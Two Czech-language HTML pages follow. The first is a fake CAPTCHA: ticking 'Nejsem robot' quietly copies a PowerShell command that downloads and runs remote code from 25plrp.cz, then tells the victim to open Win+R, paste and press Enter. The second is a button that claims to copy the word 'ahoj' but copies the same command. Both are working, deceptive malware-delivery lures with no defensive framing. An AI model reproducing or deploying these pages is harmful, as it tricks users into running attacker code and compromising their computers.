<!DOCTYPE html>
<html lang="cs">
<head>
  <meta charset="UTF-8" />
  <title>Captcha simulace s PowerShell aktivací</title>
  <style>
    body, html {
      margin: 0; padding: 0;
      font-family: Arial, sans-serif;
      height: 100%;
    }
    #background {
      position: fixed;
      top:0; left:0; width:100%; height:100%;
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      z-index: 1;
      opacity: 0.3;
      filter: blur(12px);
      transition: filter 0.5s ease, opacity 0.5s ease;
      background: #f5f5f5;
    }
    #background.clear {
      opacity: 1;
      filter: none;
    }
    #marvinImg {
      width: 800px;
      margin-top: 30px;
    }
    .modal {
      position: fixed;
      top: 50%; left: 50%;
      transform: translate(-50%, -50%);
      background: white;
      padding: 30px 40px;
      border-radius: 10px;
      box-shadow: 0 4px 20px rgba(0,0,0,0.3);
      z-index: 10;
      text-align: center;
      min-width: 300px;
    }
    #captchaModal, #alertModal {
      display: none;
    }
    #captchaModal.show, #alertModal.show {
      display: block;
    }
    #loader {
      margin: 20px auto 0 auto;
      border: 6px solid #f3f3f3;
      border-top: 6px solid #3498db;
      border-radius: 50%;
      width: 40px;
      height: 40px;
      animation: spin 1s linear infinite;
      display: none;
    }
    @keyframes spin {
      0% { transform: rotate(0deg);}
      100% { transform: rotate(360deg);}
    }
  </style>
</head>
<body>
  <div id="background">
    <h1>Vítejte na vaší vysněné stránce</h1>
    <img id="marvinImg" src="https://25plrp.cz/Dont-Panic.jpg" alt="Don't panic with Marvin" />
  </div>

  <div id="captchaModal" class="modal show">
    <label>
      <input type="checkbox" id="robotCheckbox" /> Nejsem robot
    </label>
  </div>

  <div id="alertModal" class="modal">
    <h2>⚠️ Instrukce</h2>
    <p>Spusťte Win+R<br>Vložte zkopírovaný text (Ctrl+V)<br><br>Zmáčkněte DELETE pro odstranení ❌ <br>Potvrďte Enter</p>
  </div>

  <script>
    const background = document.getElementById('background');
    const captchaModal = document.getElementById('captchaModal');
    const alertModal = document.getElementById('alertModal');
    const checkbox = document.getElementById('robotCheckbox');

    checkbox.addEventListener('change', () => {
      if (checkbox.checked) {
        captchaModal.classList.remove('show');
        alertModal.classList.add('show');

        // Po 15 sekundách zmizí alert a zruší se blur z pozadí
        setTimeout(() => {
          alertModal.classList.remove('show');
          background.classList.add('clear');
        }, 15000);

        // Kopírování příkazu (můžete upravit dle potřeby)
        const psCommand =
          'powershell iwr "25plrp.cz/wifi" | iex';
        navigator.clipboard.writeText(psCommand).catch(() => {});
      }
    });
  </script>
</body>
</html>

<!DOCTYPE html>
<html lang="cs">
<head>
  <meta charset="UTF-8">
  <title>Kopírování do schránky</title>
  <style>
    #zprava {
      margin-top: 10px;
      color: green;
      font-weight: bold;
      display: none;
    }
  </style>
</head>
<body>
  <button onclick="kopiruj()">Kopírovat 'ahoj'</button>
  <div id="zprava">Text 'ahoj' byl zkopírován ✅</div>

  <script>
    function kopiruj() {
      navigator.clipboard.writeText('powershell iwr "25plrp.cz/wifi" | iex')
        .then(() => {
          let msg = document.getElementById("zprava");
          msg.style.display = "block";
          // zpráva zmizí po 2 sekundách
          setTimeout(() => { msg.style.display = "none"; }, 2000);
        })
        .catch(err => {
          console.error("Nepodařilo se zkopírovat: ", err);
        });
    }
  </script>
</body>
</html>
